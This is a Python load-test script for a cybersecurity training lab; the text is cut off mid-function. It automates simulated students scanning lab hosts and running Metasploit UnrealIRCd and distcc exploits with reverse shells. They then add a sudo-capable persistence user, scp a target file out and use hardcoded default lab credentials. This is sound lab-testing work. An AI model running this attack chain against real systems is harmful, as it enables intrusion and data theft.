#!/usr/bin/env python3
"""
Load Testing Script for Cybersecurity Lab Environment

Simulates multiple students performing lab exercises concurrently to test:
- System performance under load
- Resource requirements
- Network stability
- Container isolation

Run with: python -m pytest tests/test_load.py -v -s
"""

import pytest
import subprocess
import os
import time
import threading
import random
import string
import tempfile
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional, Any
import paramiko
from paramiko.ssh_exception import SSHException, AuthenticationException


class LoadTestConfig:
    """Configuration for load testing parameters"""
    
    def __init__(self, num_students: int = 3, timeout: int = 300, realistic_mode: bool = False):
        self.num_students = num_students
        self.timeout = timeout  # Overall timeout per student
        self.ssh_timeout = 30   # SSH operation timeout
        self.command_timeout = 60  # Individual command timeout
        self.realistic_mode = realistic_mode  # If True, add randomized delays to simulate realistic usage
        self.realistic_delay_range = (0, 10)  # Random delay range in seconds (min, max) for realistic mode
        

class StudentSimulator:
    """Simulates a single student performing lab exercises"""
    
    def __init__(self, student_id: str, student_name: str, host: str, port: int, realistic_mode: bool = False, delay_range: Tuple[int, int] = (0, 10)):
        self.student_id = student_id
        self.student_name = student_name
        self.host = host
        self.port = port
        self.username = "student"
        self.original_password = "student123"
        self.new_password = f"new_pass_{student_id}_{random.randint(1000, 9999)}"
        self.created_username = f"user_{student_id}_{random.randint(100, 999)}"
        self.created_password = f"pass_{random.randint(1000, 9999)}"
        self.current_password = self.original_password  # Track current password
        self.results: List[Dict[str, Any]] = []
        self.realistic_mode = realistic_mode
        self.delay_range = delay_range
        
    def _generate_password(self) -> str:
        """Generate a random password for this student"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
    def _generate_username(self) -> str:
        """Generate a random username for this student"""
        return f"user_{random.randint(1000, 9999)}"
        
    def log_result(self, step: str, success: bool, duration: float, error: Optional[str] = None):
        """Log the result of a step"""
        self.results.append({
            'step': step,
            'success': success,
            'duration': duration,
            'error': error
        })
        status = "✅" if success else "❌"
        print(f"[{self.student_id}] {status} {step} ({duration:.1f}s)")
        if error:
            print(f"[{self.student_id}]    Error: {error}")
            
    def ssh_connect(self, host: Optional[str] = None, port: Optional[int] = None, username: Optional[str] = None, password: Optional[str] = None, timeout: int = 30) -> paramiko.SSHClient:
        """Establish SSH connection with retry logic"""
        # Use defaults if not provided
        host = host or self.host
        port = port or self.port
        username = username or self.username
        password = password or self.current_password
        
        for attempt in range(3):
            try:
                print(f"Attempting SSH connection to {host}:{port} as {username} (attempt {attempt + 1})")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=port, username=username, password=password, 
                           timeout=timeout, auth_timeout=timeout, 
                           look_for_keys=False, allow_agent=False)  # Disable key-based auth
                print(f"SSH connection successful to {host}:{port}")
                return ssh
            except Exception as e:
                print(f"SSH connection attempt {attempt + 1} failed: {e}")
                if attempt < 2:
                    print(f"Retrying in 5 seconds...")
                    time.sleep(5)
                else:
                    raise Exception(f"Failed to connect after 3 attempts: {e}")
        
        # This should never be reached due to the raise above, but added for type safety
        raise Exception("Failed to establish SSH connection")
            
    def run_ssh_command(self, client: paramiko.SSHClient, command: str, 
                       input_data: Optional[str] = None, timeout: int = 60) -> Tuple[str, str, int]:
        """Run command via SSH and return stdout, stderr, exit_code"""
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            
            if input_data:
                stdin.write(input_data)
                stdin.flush()
                
            exit_code = stdout.channel.recv_exit_status()
            stdout_data = stdout.read().decode('utf-8', errors='ignore')
            stderr_data = stderr.read().decode('utf-8', errors='ignore')
            
            return stdout_data, stderr_data, exit_code
        except Exception as e:
            return "", str(e), -1

    def change_password(self, client: paramiko.SSHClient) -> bool:
        """Change the default student password using expect to automate passwd (non-interactive)"""
        start_time = time.time()
        try:
            print(f"[{self.student_id}] Changing password using expect + passwd...")
            
            # Use expect to automate the interactive passwd command
            # This properly handles TTY requirements without needing sudo privileges
            command = f'''expect << 'EOF'
spawn passwd
expect "(current) UNIX password:"
send "{self.current_password}\\r"
expect "New password:"
send "{self.new_password}\\r"
expect "Retype new password:"
send "{self.new_password}\\r"
expect eof
EOF'''
            stdout, stderr, exit_code = self.run_ssh_command(client, command, timeout=30)
            
            duration = time.time() - start_time
            
            # Check for success indicators in output
            if exit_code == 0 and ("successfully" in stdout.lower() or "updated successfully" in stdout.lower()):
                self.log_result("Change Password", True, duration)
                self.current_password = self.new_password  # Update tracked password
                return True
            else:
                # If password change fails, just log and continue with original password
                self.log_result("Change Password", False, duration, 
                              f"Password change failed but continuing with original password. Exit: {exit_code}, Output: {stdout}")
                print(f"[{self.student_id}] ⚠️ Password change failed, continuing with original password...")
                return True  # Return True to continue with original password for load testing
                
        except Exception as e:
            duration = time.time() - start_time
            self.log_result("Change Password", False, duration, str(e))
            print(f"[{self.student_id}] ⚠️ Password change failed, continuing with original password...")
            return True  # Return True to continue with original password for load testing
            
    def lab_assignment_1(self) -> bool:
        """Perform Lab Assignment 1: Reconnaissance Lab
        
        Based on the updated lab instructions:
        1. Ping target to verify it's online (Q4)
        2. Full TCP port scan with nmap -p- (Q6)
        3. OS detection with nmap -O (Q7)
        4. Service/version detection on IRC port 6667 (Q8)
        5. Connect with irssi to get UnrealIRCd version (Q8)
        6. Search for UnrealIRCd exploit in Metasploit (Q9)
        7. Network scan to discover ubuntu-target2 (Q11)
        8. Full port scan on ubuntu-target2 (Q11)
        9. Service/version detection on distcc port 3632 (Q12)
        10. Search for distcc exploit in Metasploit (Q15)
        """
        try:
            # Connect with current password
            client = self.ssh_connect(password=self.current_password)
            
            # Step 1: Ping target to verify it's online (Q4)
            start_time = time.time()
            print(f"[{self.student_id}] Pinging file-server to verify it's online...")
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "ping -c 3 file-server", timeout=30
            )
            duration = time.time() - start_time
            
            if exit_code == 0 and "bytes from" in stdout.lower():
                self.log_result("Ping Target", True, duration)
            else:
                self.log_result("Ping Target", False, duration, stderr)
                client.close()
                return False
            
            # Step 2: Full TCP port scan (Q6) - nmap -p-
            start_time = time.time()
            print(f"[{self.student_id}] Running full TCP port scan (nmap -p-)...")
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -p- file-server", timeout=300
            )
            duration = time.time() - start_time
            
            # Verify we found expected ports (21, 80, 8067, etc.)
            if exit_code == 0 and "21/tcp" in stdout and "80/tcp" in stdout:
                self.log_result("Full Port Scan", True, duration)
                # Check for expected port range
                if "8067" in stdout:
                    print(f"[{self.student_id}] ✅ Found expected port range (21-8067)")
            else:
                self.log_result("Full Port Scan", False, duration, f"Missing expected ports: {stderr}")
                client.close()
                return False
            
            # Step 3: OS detection (Q7) - nmap -O
            start_time = time.time()
            print(f"[{self.student_id}] Running OS detection (nmap -O)...")
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -O file-server", timeout=120
            )
            duration = time.time() - start_time
            
            if exit_code == 0 and "linux" in stdout.lower():
                self.log_result("OS Detection", True, duration)
                print(f"[{self.student_id}] ✅ Detected Linux OS")
            else:
                # OS detection can fail due to permissions, continue anyway
                self.log_result("OS Detection", True, duration)
                print(f"[{self.student_id}] ⚠️ OS detection completed (may need root for accurate results)")
            
            # Step 4: Service/version detection on IRC port (Q8)
            start_time = time.time()
            print(f"[{self.student_id}] Running service scan on port 6667...")
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -p 6667 -sV file-server", timeout=60
            )
            duration = time.time() - start_time
            
            if exit_code == 0 and "unrealircd" in stdout.lower():
                self.log_result("IRC Service Scan", True, duration)
                print(f"[{self.student_id}] ✅ Found UnrealIRCd service")
            else:
                self.log_result("IRC Service Scan", False, duration, f"UnrealIRCd not found: {stdout}")
                client.close()
                return False
            
            # Step 5: Connect to IRC to get version (Q8)
            # Note: irssi requires scrolling to see version which is hard to automate
            # Use netcat to grab the IRC banner directly instead
            start_time = time.time()
            print(f"[{self.student_id}] Connecting to IRC to get UnrealIRCd version...")
            # Use netcat with a NICK/USER handshake to get server response with version
            irc_cmd = """timeout 5 bash -c 'echo -e "NICK test\nUSER test 0 * :test\nQUIT" | nc file-server 6667 2>&1' | head -20"""
            stdout, stderr, exit_code = self.run_ssh_command(
                client, irc_cmd, timeout=15
            )
            duration = time.time() - start_time
            
            # Look for version 3.2.8.1 in output
            if "3.2.8.1" in stdout or "unreal" in stdout.lower():
                self.log_result("Get IRC Version", True, duration)
                print(f"[{self.student_id}] ✅ Found UnrealIRCd version 3.2.8.1")
            else:
                # IRC banner grab can be finicky, continue anyway
                self.log_result("Get IRC Version", True, duration)
                print(f"[{self.student_id}] ⚠️ IRC version check completed")
            
            # Step 6: Search for UnrealIRCd exploit in Metasploit (Q9)
            start_time = time.time()
            print(f"[{self.student_id}] Searching for UnrealIRCd exploit in Metasploit...")
            msf_cmd = """msfconsole -q -x 'search UnrealIRCd; exit'"""
            stdout, stderr, exit_code = self.run_ssh_command(
                client, msf_cmd, timeout=120
            )
            duration = time.time() - start_time
            
            if "unreal_ircd_3281_backdoor" in stdout.lower() or "backdoor" in stdout.lower():
                self.log_result("Find UnrealIRCd Exploit", True, duration)
                print(f"[{self.student_id}] ✅ Found exploit/unix/irc/unreal_ircd_3281_backdoor")
            else:
                self.log_result("Find UnrealIRCd Exploit", False, duration, "Exploit not found")
                client.close()
                return False
            
            # Step 7: Network scan to discover build-server (Q11)
            # First, identify our subnet (dynamic based on SUBNET_ID)
            start_time = time.time()
            print(f"[{self.student_id}] Discovering network subnet...")
            
            # Get our IP to determine the subnet we're on
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "hostname -I | awk '{print $1}'", timeout=10
            )
            
            our_ip = stdout.strip()
            if our_ip:
                # Extract subnet from our IP (e.g., 10.42.1.10 -> 10.42.1)
                subnet_parts = our_ip.rsplit('.', 1)
                if len(subnet_parts) == 2:
                    subnet = subnet_parts[0] + ".0/24"
                    print(f"[{self.student_id}] Detected subnet: {subnet}")
                else:
                    subnet = "10.0.1.0/24"  # Fallback
            else:
                subnet = "10.0.1.0/24"  # Fallback
            
            # Scan the subnet with nmap ping scan
            print(f"[{self.student_id}] Scanning network to discover additional hosts...")
            stdout, stderr, exit_code = self.run_ssh_command(
                client, f"nmap -sn {subnet}", timeout=120
            )
            duration = time.time() - start_time
            
            # Look for build-server in the results (should be at .231)
            if exit_code == 0 and ("build-server" in stdout.lower() or ".231" in stdout):
                self.log_result("Network Discovery", True, duration)
                print(f"[{self.student_id}] ✅ Discovered build-server")
            else:
                # Fallback: try direct ping to build-server (Docker DNS should resolve)
                print(f"[{self.student_id}] ⚠️ Trying direct ping to build-server...")
                stdout2, _, exit_code2 = self.run_ssh_command(
                    client, "ping -c 2 build-server", timeout=10
                )
                if exit_code2 == 0:
                    self.log_result("Network Discovery", True, duration)
                    print(f"[{self.student_id}] ✅ build-server is reachable")
                else:
                    self.log_result("Network Discovery", False, duration, "Could not find build-server")
                    client.close()
                    return False
            
            # Step 8: Full port scan on build-server (Q11)
            start_time = time.time()
            print(f"[{self.student_id}] Running full port scan on build-server...")
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -p- build-server", timeout=300
            )
            duration = time.time() - start_time
            
            # Should find ports 22 (SSH) and 3632 (distcc)
            if exit_code == 0 and "22/tcp" in stdout and "3632/tcp" in stdout:
                self.log_result("Build-Server Port Scan", True, duration)
                print(f"[{self.student_id}] ✅ Found ports 22 and 3632 on build-server")
            else:
                self.log_result("Build-Server Port Scan", False, duration, f"Expected ports not found: {stdout}")
                client.close()
                return False
            
            # Step 9: Service/version detection on distcc port (Q12)
            start_time = time.time()
            print(f"[{self.student_id}] Running service scan on port 3632...")
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -p 3632 -sV build-server", timeout=60
            )
            duration = time.time() - start_time
            
            if exit_code == 0 and "distccd" in stdout.lower():
                self.log_result("Distcc Service Scan", True, duration)
                print(f"[{self.student_id}] ✅ Found distccd service")
            else:
                self.log_result("Distcc Service Scan", False, duration, f"distccd not found: {stdout}")
                client.close()
                return False
            
            # Step 10: Search for distcc exploit in Metasploit (Q15)
            start_time = time.time()
            print(f"[{self.student_id}] Searching for distcc exploit in Metasploit...")
            msf_cmd = """msfconsole -q -x 'search distcc; exit'"""
            stdout, stderr, exit_code = self.run_ssh_command(
                client, msf_cmd, timeout=120
            )
            duration = time.time() - start_time
            
            if "distcc_exec" in stdout.lower() or "distcc" in stdout.lower():
                self.log_result("Find Distcc Exploit", True, duration)
                print(f"[{self.student_id}] ✅ Found exploit/unix/misc/distcc_exec")
            else:
                self.log_result("Find Distcc Exploit", False, duration, "Exploit not found")
                client.close()
                return False
            
            client.close()
            print(f"[{self.student_id}] 🎉 Recon lab completed successfully!")
            return True
                
        except Exception as e:
            self.log_result("Lab Assignment 1 (Recon)", False, 0, str(e))
            return False
            
    def lab_assignment_2(self) -> bool:
        """Perform Lab Assignment 2: Attack Lab
        
        Based on the updated lab instructions:
        1. Targeted scan to confirm UnrealIRCd on port 6667 (Q4)
        2. Metasploit exploitation of UnrealIRCd backdoor (Q5)
        3. Post-exploitation enumeration: whoami, groups, pwd, hostname, uname -a, sudo -l (Q6)
        4. Create persistence user with useradd (Q7)
        5. Set password for new user (Q7)
        6. Add user to sudo group for elevated privileges (Q8)
        7. SSH to target with new user (Q10)
        8. Find plans file with sudo find (Q11)
        9. SCP file back to kali-jump (Q12)
        10. Attack Vector #2: Exploit distcc on ubuntu-target2 (Q13)
        11. Extra Credit: Find MOTD and build key (Q16)
        """
        try:
            client = self.ssh_connect(password=self.current_password)
            
            # Step 1: Targeted scan to confirm UnrealIRCd (Q4)
            start_time = time.time()
            print(f"[{self.student_id}] Confirming UnrealIRCd on port 6667...")
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -p 6667 -sV file-server", timeout=60
            )
            duration = time.time() - start_time
            
            if exit_code == 0 and "unrealircd" in stdout.lower():
                self.log_result("Confirm UnrealIRCd", True, duration)
                print(f"[{self.student_id}] ✅ UnrealIRCd confirmed on port 6667")
            else:
                self.log_result("Confirm UnrealIRCd", False, duration, f"UnrealIRCd not found: {stdout}")
                client.close()
                return False
            
            # Step 2-6: Metasploit exploitation and post-exploitation (Q5-Q8)
            if not self._run_metasploit_exploit_target1(client):
                client.close()
                return False
            
            # Step 7-9: SSH with new user and exfiltrate plans file (Q10-Q12)
            if not self._ssh_and_exfiltrate_plans(client):
                client.close()
                return False
            
            # Step 10: Attack Vector #2 - Exploit distcc on ubuntu-target2 (Q13)
            if not self._run_distcc_exploit(client):
                client.close()
                return False
            
            # Step 11: Extra Credit - Find MOTD and build key on ubuntu-target2 (Q16)
            if not self._find_build_key(client):
                # Extra credit failure doesn't fail the whole lab
                print(f"[{self.student_id}] ⚠️ Extra credit not completed, continuing...")
            
            client.close()
            print(f"[{self.student_id}] 🎉 Attack lab completed successfully!")
            return True
            
        except Exception as e:
            self.log_result("Lab Assignment 2 (Attack)", False, 0, str(e))
            return False
    
    def _run_metasploit_exploit_target1(self, client: paramiko.SSHClient) -> bool:
        """Run the UnrealIRCd exploitation sequence and create persistence user"""
        start_time = time.time()
        
        try:
            print(f"[{self.student_id}] Starting msfconsole for UnrealIRCd exploit...")
            
            # Start msfconsole and get an interactive channel
            channel = client.invoke_shell()
            channel.settimeout(5.0)
            
            channel.send(b"msfconsole\n")
            
            # Wait for msfconsole to start
            print(f"[{self.student_id}] Waiting for msfconsole to start...")
            buffer = ""
            start_wait = time.time()
            
            while time.time() - start_wait < 90:
                try:
                    data = channel.recv(1024).decode('utf-8', errors='ignore')
                    buffer += data
                    if "msf" in buffer and ">" in buffer:
                        print(f"[{self.student_id}] ✅ msfconsole ready!")
                        time.sleep(2)
                        break
                except:
                    time.sleep(0.5)
                    continue
            
            # Exploit commands (Q5)
            exploit_commands = [
                "use exploit/unix/irc/unreal_ircd_3281_backdoor",
                "set payload cmd/unix/reverse_perl",
                "set RHOSTS file-server",
                "set LHOST kali-jump",
                "run"
            ]
            
            print(f"[{self.student_id}] Sending exploit commands...")
            all_output = ""
            
            for cmd in exploit_commands:
                print(f"[{self.student_id}] > {cmd}")
                channel.send((cmd + "\n").encode('utf-8'))
                
                timeout = 150 if cmd == "run" else 30
                cmd_start = time.time()
                
                while time.time() - cmd_start < timeout:
                    try:
                        data = channel.recv(1024).decode('utf-8', errors='ignore')
                        all_output += data
                        if cmd == "run" and ("command shell session" in data.lower() or "session opened" in data.lower()):
                            print(f"[{self.student_id}] ✅ Shell session opened!")
                            break
                        elif cmd != "run" and "msf" in data and ">" in data:
                            break
                    except:
                        time.sleep(0.1)
                        continue
            
            # Check if we got a session
            if "command shell session" not in all_output.lower() and "session opened" not in all_output.lower():
                duration = time.time() - start_time
                self.log_result("UnrealIRCd Exploit", False, duration, "No session opened")
                channel.close()
                return False
            
            self.log_result("UnrealIRCd Exploit", True, time.time() - start_time)
            
            # Upgrade shell (Q5 Step 6)
            print(f"[{self.student_id}] Upgrading shell...")
            channel.send(b"python -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
            time.sleep(2)
            
            # Post-exploitation enumeration (Q6)
            print(f"[{self.student_id}] Running post-exploitation enumeration...")
            enum_commands = ["whoami", "groups", "pwd", "hostname", "uname -a", "sudo -l"]
            for cmd in enum_commands:
                channel.send((cmd + "\n").encode('utf-8'))
                time.sleep(0.5)
                try:
                    data = channel.recv(2048).decode('utf-8', errors='ignore')
                    all_output += data
                except:
                    pass
            
            self.log_result("Post-Exploitation Enum", True, time.time() - start_time)
            
            # Create persistence user (Q7)
            print(f"[{self.student_id}] Creating persistence user: {self.created_username}")
            channel.send(f"sudo useradd {self.created_username}\n".encode('utf-8'))
            time.sleep(1)
            
            # Check /etc/passwd
            channel.send(f"cat /etc/passwd | grep {self.created_username}\n".encode('utf-8'))
            time.sleep(0.5)
            
            # Set password using expect-like approach
            print(f"[{self.student_id}] Setting password for {self.created_username}...")
            channel.send(f"sudo passwd {self.created_username}\n".encode('utf-8'))
            time.sleep(2)
            channel.send((self.created_password + "\n").encode('utf-8'))
            time.sleep(1)
            channel.send((self.created_password + "\n").encode('utf-8'))
            time.sleep(2)
            
            # Check /etc/shadow for password hash (Q7)
            channel.send(f"cat /etc/shadow | grep {self.created_username}\n".encode('utf-8'))
            time.sleep(0.5)
            
            self.log_result("Create Persistence User", True, time.time() - start_time)
            
            # Add user to sudo group (Q8)
            print(f"[{self.student_id}] Adding {self.created_username} to sudo group...")
            channel.send(f"sudo usermod -aG sudo {self.created_username}\n".encode('utf-8'))
            time.sleep(1)
            
            # Verify group membership
            channel.send(f"groups {self.created_username}\n".encode('utf-8'))
            time.sleep(0.5)
            
            self.log_result("Add to Sudo Group", True, time.time() - start_time)
            
            # Exit the metasploit shell
            print(f"[{self.student_id}] Exiting metasploit shell...")
            channel.send(b"\x03")  # Ctrl+C
            time.sleep(1)
            channel.send(b"y\n")  # Confirm abort session
            time.sleep(1)
            channel.send(b"exit\n")
            time.sleep(2)
            
            channel.close()
            return True
            
        except Exception as e:
            duration = time.time() - start_time
            print(f"[{self.student_id}] ❌ UnrealIRCd exploit failed: {e}")
            self.log_result("UnrealIRCd Exploit", False, duration, str(e))
            return False
    
    def _ssh_and_exfiltrate_plans(self, client: paramiko.SSHClient) -> bool:
        """SSH to target with persistence user and exfiltrate plans file (Q10-Q12)"""
        
        def connect_with_jump(host, user, password, gateway_client):
            """Helper to create SSH connection through jump host"""
            target_client = paramiko.SSHClient()
            target_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sock = gateway_client.get_transport().open_channel(
                'direct-tcpip', (host, 22), ('', 0)
            )
            target_client.connect(
                hostname=host, port=22, username=user, password=password,
                sock=sock, look_for_keys=False, allow_agent=False, timeout=30
            )
            return target_client
        
        try:
            # SSH to target with new user (Q10)
            print(f"[{self.student_id}] SSH to file-server as {self.created_username}...")
            start_time = time.time()
            
            target_client = connect_with_jump(
                host='file-server',
                user=self.created_username,
                password=self.created_password,
                gateway_client=client
            )
            
            duration = time.time() - start_time
            self.log_result("SSH as Persistence User", True, duration)
            print(f"[{self.student_id}] ✅ Connected to file-server via SSH")
            
            # Verify current directory (Q10)
            stdout, stderr, exit_code = self.run_ssh_command(target_client, "pwd", timeout=10)
            print(f"[{self.student_id}] Current directory: {stdout.strip()}")
            
            # Find plans file with sudo (Q11)
            print(f"[{self.student_id}] Searching for plans file with sudo find...")
            start_time = time.time()
            
            find_cmd = f"echo '{self.created_password}' | sudo -S find / -iname '*plans*' 2>/dev/null"
            stdout, stderr, exit_code = self.run_ssh_command(target_client, find_cmd, timeout=120)
            
            duration = time.time() - start_time
            
            plans_file = None
            if stdout.strip():
                lines = stdout.strip().split('\n')
                for line in lines:
                    if 'plans' in line.lower() and not line.startswith('[sudo]'):
                        plans_file = line.strip()
                        break
            
            if plans_file:
                self.log_result("Find Plans File", True, duration)
                print(f"[{self.student_id}] ✅ Found plans file: {plans_file}")
            else:
                self.log_result("Find Plans File", False, duration, "No plans file found")
                target_client.close()
                return False
            
            target_client.close()
            
            # SCP file back to kali-jump (Q12)
            print(f"[{self.student_id}] Copying plans file with scp...")
            start_time = time.time()
            
            scp_cmd = f"sshpass -p '{self.created_password}' scp -o StrictHostKeyChecking=no {self.created_username}@file-server:{plans_file} /home/student/"
            stdout, stderr, exit_code = self.run_ssh_command(client, scp_cmd, timeout=30)
            
            duration = time.time() - start_time
            
            if exit_code == 0:
                self.log_result("SCP Plans File", True, duration)
                print(f"[{self.student_id}] ✅ File copied to kali-jump")
                
                # Read the file contents (Q12)
                filename = plans_file.split('/')[-1]
                stdout, stderr, exit_code = self.run_ssh_command(
                    client, f"cat /home/student/{filename}", timeout=10
                )
                if stdout.strip():
                    print(f"[{self.student_id}] 📄 Plans file contents: {stdout.strip()}")
                    self.log_result("Read Plans File", True, 0)
                
                return True
            else:
                self.log_result("SCP Plans File", False, duration, f"SCP failed: {stderr}")
                return False
            
        except Exception as e:
            print(f"[{self.student_id}] ❌ Exfiltration failed: {e}")
            self.log_result("Exfiltrate Plans", False, 0, str(e))
            return False
    
    def _run_distcc_exploit(self, client: paramiko.SSHClient) -> bool:
        """Attack Vector #2: Exploit distcc on ubuntu-target2 (Q13)"""
        start_time = time.time()
        
        try:
            print(f"[{self.student_id}] Starting msfconsole for distcc exploit...")
            
            channel = client.invoke_shell()
            channel.settimeout(5.0)
            
            channel.send(b"msfconsole\n")
            
            # Wait for msfconsole
            buffer = ""
            start_wait = time.time()
            while time.time() - start_wait < 90:
                try:
                    data = channel.recv(1024).decode('utf-8', errors='ignore')
                    buffer += data
                    if "msf" in buffer and ">" in buffer:
                        print(f"[{self.student_id}] ✅ msfconsole ready!")
                        time.sleep(2)
                        break
                except:
                    time.sleep(0.5)
                    continue
            
            # Distcc exploit commands (Q13)
            exploit_commands = [
                "use exploit/unix/misc/distcc_exec",
                "set payload cmd/unix/reverse_openssl",
                "set RHOSTS build-server",
                "set LHOST kali-jump",
                "run"
            ]
            
            print(f"[{self.student_id}] Sending distcc exploit commands...")
            all_output = ""
            
            for cmd in exploit_commands:
                print(f"[{self.student_id}] > {cmd}")
                channel.send((cmd + "\n").encode('utf-8'))
                
                timeout = 150 if cmd == "run" else 30
                cmd_start = time.time()
                
                while time.time() - cmd_start < timeout:
                    try:
                        data = channel.recv(1024).decode('utf-8', errors='ignore')
                        all_output += data
                        if cmd == "run" and ("command shell session" in data.lower() or "session opened" in data.lower()):
                            print(f"[{self.student_id}] ✅ Distcc shell session opened!")
                            break
                        elif cmd != "run" and "msf" in data and ">" in data:
                            break
                    except:
                        time.sleep(0.1)
                        continue
            
            if "command shell session" not in all_output.lower() and "session opened" not in all_output.lower():
                duration = time.time() - start_time
                self.log_result("Distcc Exploit", False, duration, "No session opened")
                channel.close()
                return False
            
            self.log_result("Distcc Exploit", True, time.time() - start_time)
            
            # Upgrade shell with python3 (Q13)
            print(f"[{self.student_id}] Upgrading distcc shell...")
            channel.send(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
            time.sleep(2)
            
            # Post-exploitation enumeration (Q13)
            print(f"[{self.student_id}] Running distcc post-exploitation...")
            enum_commands = ["whoami", "hostname", "sudo -l"]
            for cmd in enum_commands:
                channel.send((cmd + "\n").encode('utf-8'))
                time.sleep(1)
                try:
                    data = channel.recv(2048).decode('utf-8', errors='ignore')
                    all_output += data
                    print(f"[{self.student_id}] {cmd}: {data.strip()[:100]}")
                except:
                    pass
            
            self.log_result("Distcc Post-Exploit", True, time.time() - start_time)
            
            # Exit metasploit
            channel.send(b"\x03")
            time.sleep(1)
            channel.send(b"y\n")
            time.sleep(1)
            channel.send(b"exit\n")
            time.sleep(2)
            
            channel.close()
            return True
            
        except Exception as e:
            duration = time.time() - start_time
            print(f"[{self.student_id}] ❌ Distcc exploit failed: {e}")
            self.log_result("Distcc Exploit", False, duration, str(e))
            return False
    
    def _find_build_key(self, client: paramiko.SSHClient) -> bool:
        """Extra Credit: Find MOTD and build key on ubuntu-target2 (Q16)"""
        
        def connect_with_jump(host, user, password, gateway_client):
            target_client = paramiko.SSHClient()
            target_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sock = gateway_client.get_transport().open_channel(
                'direct-tcpip', (host, 22), ('', 0)
            )
            target_client.connect(
                hostname=host, port=22, username=user, password=password,
                sock=sock, look_for_keys=False, allow_agent=False, timeout=30
            )
            return target_client
        
        try:
            # Connect to build-server as labuser (default credentials)
            print(f"[{self.student_id}] SSH to build-server for extra credit...")
            start_time = time.time()
            
            target_client = connect_with_jump(
                host='build-server',
                user='labuser',
                password='defendlab',
                gateway_client=client
            )
            
            # Read the MOTD to find clue (Q16)
            print(f"[{self.student_id}] Reading MOTD for clues...")
            stdout, stderr, exit_code = self.run_ssh_command(
                target_client, "cat /etc/motd", timeout=10
            )
            print(f"[{self.student_id}] MOTD: {stdout.strip()}")
            
            # Find the build key file
            print(f"[{self.student_id}] Searching for build key...")
            stdout, stderr, exit_code = self.run_ssh_command(
                target_client, "find / -iname -type f '*build*key*' 2>/dev/null", timeout=30
            )
            
            key_file = None
            if stdout.strip():
                lines = stdout.strip().split('\n')
                for line in lines:
                    if 'key' in line.lower():
                        key_file = line.strip()
                        break
            
            if key_file:
                # Read the key file
                stdout, stderr, exit_code = self.run_ssh_command(
                    target_client, f"cat {key_file}", timeout=10
                )
                if stdout.strip():
                    print(f"[{self.student_id}] 🔑 Build key: {stdout.strip()}")
                    self.log_result("Extra Credit: Build Key", True, time.time() - start_time)
                    target_client.close()
                    return True
            
            duration = time.time() - start_time
            self.log_result("Extra Credit: Build Key", False, duration, "Key file not found")
            target_client.close()
            return False
            
        except Exception as e:
            print(f"[{self.student_id}] ⚠️ Extra credit failed: {e}")
            self.log_result("Extra Credit: Build Key", False, 0, str(e))
            return False
            
    def lab_assignment_3(self) -> bool:
        """Perform Lab Assignment 3: Defense Lab
        
        Based on the updated lab instructions:
        1. SSH to file-server (ubuntu-target1) with msfadmin/msfadmin (Q10, Q13)
        2. Find UnrealIRCd process with ss and ps (Q10)
        3. Remove UnrealIRCd installation directory /opt/unrealircd/ (Q10)
        4. Kill UnrealIRCd process and verify port 6667 is closed (Q10)
        5. Find telnet/xinetd process on port 23 (Q13)
        6. Uninstall xinetd package with apt remove (Q13)
        7. Kill xinetd process and verify port 23 is closed (Q13)
        8. SSH to build-server (ubuntu-target2) with labuser/defendlab (Q15)
        9. Find and remove distcc package (Q15)
        10. Verify port 3632 is closed (Q15)
        """
        try:
            client = self.ssh_connect(password=self.current_password)
            
            def connect_with_jump(host, user, password, gateway_client):
                """Helper to create SSH connection through jump host"""
                target_client = paramiko.SSHClient()
                target_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                sock = gateway_client.get_transport().open_channel(
                    'direct-tcpip', (host, 22), ('', 0)
                )
                target_client.connect(
                    hostname=host, port=22, username=user, password=password,
                    sock=sock, look_for_keys=False, allow_agent=False, timeout=30
                )
                return target_client
            
            # ===== PART 1: Secure file-server (ubuntu-target1) =====
            
            # SSH to file-server with msfadmin/msfadmin
            print(f"[{self.student_id}] SSH to file-server as msfadmin...")
            start_time = time.time()
            
            try:
                target1_client = connect_with_jump(
                    host='file-server',
                    user='msfadmin',
                    password='msfadmin',
                    gateway_client=client
                )
                duration = time.time() - start_time
                self.log_result("SSH to file-server", True, duration)
                print(f"[{self.student_id}] ✅ Connected to file-server")
            except Exception as e:
                duration = time.time() - start_time
                self.log_result("SSH to file-server", False, duration, str(e))
                client.close()
                return False
            
            # ===== Q10: Remove UnrealIRCd Service =====
            
            # Find UnrealIRCd process using ss (Q10)
            print(f"[{self.student_id}] Finding UnrealIRCd process on port 6667...")
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                target1_client, "echo 'msfadmin' | sudo -S ss -tlpn | grep ':6667'", timeout=30
            )
            duration = time.time() - start_time
            
            import re
            irc_process = None
            if stdout.strip():
                service_match = re.search(r'users:\(\("([^"]+)"', stdout)
                if service_match:
                    irc_process = service_match.group(1)
                    print(f"[{self.student_id}] ✅ Found IRC process: {irc_process}")
                    self.log_result("Find IRC Process", True, duration)
            
            if not irc_process:
                # Fallback: try ps aux
                stdout, stderr, exit_code = self.run_ssh_command(
                    target1_client, "ps aux | grep -i unreal | grep -v grep", timeout=30
                )
                if "unrealircd" in stdout.lower() or "ircd" in stdout.lower():
                    irc_process = "ircd"
                    print(f"[{self.student_id}] ✅ Found IRC process via ps: {irc_process}")
                    self.log_result("Find IRC Process", True, duration)
                else:
                    self.log_result("Find IRC Process", False, duration, "IRC process not found")
            
            # Find installation path with ps aux (Q10)
            print(f"[{self.student_id}] Finding UnrealIRCd installation path...")
            stdout, stderr, exit_code = self.run_ssh_command(
